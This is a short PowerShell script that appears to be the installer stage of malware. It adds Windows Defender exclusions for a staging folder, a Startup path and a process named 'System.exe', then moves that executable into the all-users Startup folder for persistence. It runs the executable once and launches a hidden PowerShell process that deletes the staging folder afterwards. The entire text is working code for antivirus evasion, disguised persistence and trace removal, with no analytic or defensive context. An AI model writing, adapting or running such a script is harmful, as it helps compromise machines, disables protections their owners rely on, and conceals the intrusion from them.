$ErrorActionPreference = "Stop"
$tempDir = "$env:TEMP\rt"
$exePath = "$tempDir\System.exe"
$startupDir = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$startupPath = "$startupDir\System.exe"

# Ensure startup folder exists
if (-not (Test-Path $startupDir)) {
    New-Item -ItemType Directory -Path $startupDir -Force
}

# Add Defender Exclusions
try {
    Add-MpPreference -ExclusionPath $tempDir
    Add-MpPreference -ExclusionPath $startupPath
    Add-MpPreference -ExclusionProcess "System.exe"
} catch {
    Write-Warning "Defender exclusion failed: $_"
}

# Move to Startup
try {
    Move-Item -Path $exePath -Destination $startupPath -Force
} catch {
    Write-Error "Move failed: $_"
    exit 1
}

# Run once
try {
    Start-Process $startupPath -Wait
} catch {
    Write-Warning "Execution failed: $_"
}

# Self-delete (Hidden)
$cleanupCommand = "Start-Sleep -Seconds 5; Remove-Item -Recurse -Force '$tempDir'"
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command $cleanupCommand"
